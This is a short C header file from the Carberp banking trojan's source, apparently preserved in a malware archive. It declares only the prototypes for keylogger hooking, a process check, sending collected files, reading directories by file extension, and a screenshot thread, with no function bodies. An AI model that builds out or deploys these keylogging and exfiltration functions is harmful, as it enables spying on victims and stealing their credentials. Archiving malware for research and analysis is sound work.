/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef		__keylogger_h__
#define		__keylogger_h__

#include <windows.h>


//*********************************************************************
bool UnHookKeyLogger();

//*********************************************************************
bool HookKeyLogger();

//*********************************************************************
bool WINAPI IsKeyLoggerProcess();
void SendLoadedFiles();
LPBYTE ReadOpenDirectory(int FlagFolderDest,WCHAR *Path, WCHAR *Ext);
DWORD WINAPI SetScreensThread( LPVOID lpData );

#endif		//__keylogger_h__